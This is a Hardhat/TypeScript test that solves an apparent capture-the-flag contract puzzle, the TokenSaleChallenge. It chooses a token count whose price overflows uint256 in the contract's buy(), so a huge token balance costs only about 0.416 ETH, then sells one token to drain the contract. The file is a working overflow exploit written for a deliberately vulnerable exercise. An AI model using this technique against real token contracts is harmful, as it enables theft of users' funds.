import { ethers } from "hardhat";
import { Contract, BigNumber } from "ethers";
import { expect } from "chai";
import { getContract } from "../utiils";

let contract: Contract;

type tokensAndEth = {
    tokens: BigNumber,
    eth: BigNumber,
}

function calcTokensAndEth(): tokensAndEth {
    let overflow = BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").add(1)
    const pricePerToken = ethers.utils.parseEther("1");

    // solved by https://www.dcode.fr/modular-equation-solver
    const eth = BigNumber.from("415992086870360064")
    const tokens = (overflow.add(eth)).div(pricePerToken)

    return {
        tokens,
        eth
    }
}

before(async () => {
    contract = await getContract("TokenSaleChallenge", "0xE9440D21d69f5B10876424821dA95F68559D6AdE", ethers.utils.parseEther("1"))
});

it("solves the challenge", async function () {
    const { tokens, eth } = calcTokensAndEth();

    const buyTx = await contract.buy(tokens, {
        value: eth,
    });
    const buyTxHash = buyTx && buyTx.hash
    expect(buyTxHash).to.not.be.undefined

    const sellTx = await contract.sell(1);
    const sellTxHash = sellTx && sellTx.hash
    expect(sellTxHash).to.not.be.undefined

    const isComplete = await contract.isComplete()
    expect(isComplete).to.be.true;
});